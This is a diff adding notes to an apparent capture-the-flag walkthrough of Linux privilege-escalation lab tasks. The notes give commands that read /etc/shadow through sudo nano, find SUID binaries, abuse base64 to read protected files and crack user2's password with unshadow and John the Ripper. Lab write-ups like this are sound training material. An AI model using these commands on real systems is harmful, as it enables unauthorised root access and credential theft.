@@ -33,6 +33,7 @@ If done correctly, you should now be root.
 flag1.txt is located in /home/matt/
 
 
+  
 Task 6 {Privilege Escalation - Sudo}
 
 Question 1:  How many programs can the user "karen" run on the target system with sudo rights?
@@ -48,3 +49,25 @@ Question 4: What is the hash of frank's password?
 {Hint: sudo nano /etc/shadow}
 
 
+
+Task 7 {Privilege Escalation - SUID}
+
+Question 1: Which user shares the name of a great comic book writer?
+{Hint: nano /etc/passwd}
+
+Question 2: What is the password of user2?
+{First, use [find / -type f -perm -04000 -ls 2>/dev/null] to find files that have SUID or SGID set.
+Compare this list against gtfobins with the SUID filter set.
+The only viable option appears to be base64. In order to get user2's password, we must abuse the binary to 
+be able to read the /etc/shadow file.
+LFILE=/etc/shadow
+base64 "/etc/shadow" | base64 --decode 
+
+Copy the output to a txt file, along with the contents of /etc/passwd in another. Next, we must unshadow it.
+"unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt"
+Now, run John against it
+john unshadowed.txt
+
+Question 3: What is the content of the flag3.txt file?
+{LFILE=flag3.txt
+base64 "flag3.txt" | base64 --decode}
